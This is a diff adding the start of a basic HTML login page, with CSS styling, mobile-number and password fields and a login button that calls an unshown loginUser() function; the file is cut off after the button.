@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial;
+      background: #f2f2f2;
+      text-align: center;
+    }
+
+    .top {
+      background: red;
+      height: 50px;
+    }
+
+    .logo {
+      margin-top: 20px;
+    }
+
+    .logo img {
+      width: 100px;
+      border-radius: 50%;
+    }
+
+    h1 {
+      color: red;
+    }
+
+    .box {
+      background: white;
+      margin: 20px;
+      padding: 20px;
+      border-radius: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    input {
+      width: 90%;
+      padding: 15px;
+      margin: 10px 0;
+      border-radius: 30px;
+      border: none;
+      background: #f2f2f2;
+      font-size: 16px;
+    }
+
+    .login-btn {
+      width: 90%;
+      padding: 15px;
+      background: red;
+      color: white;
+      border: none;
+      border-radius: 30px;
+      font-size: 18px;
+      margin-top: 10px;
+    }
+
+    .register-btn {
+      width: 70%;
+      padding: 15px;
+      background: #2d8cff;
+      color: white;
+      border: none;
+      border-radius: 30px;
+      font-size: 18px;
+      margin-top: 10px;
+    }
+
+    .link {
+      color: red;
+      margin-top: 10px;
+    }
+
+    .support {
+      color: green;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="top"></div>
+
+<div class="logo">
+  <img src="https://i.ibb.co/6bQGZpG/gold-logo.png">
+</div>
+
+<h1>Login</h1>
+
+<p>🔄 Refresh URL</p>
+
+<div class="box">
+  <input type="text" placeholder="Mobile Number" id="mobile">
+  <input type="password" placeholder="Password" id="password">
+
+  <p class="link">Forgot Password?</p>
+
+
+
+  
+  
+  <button class="login-btn" onclick="loginUser()">LOGIN</button>
+
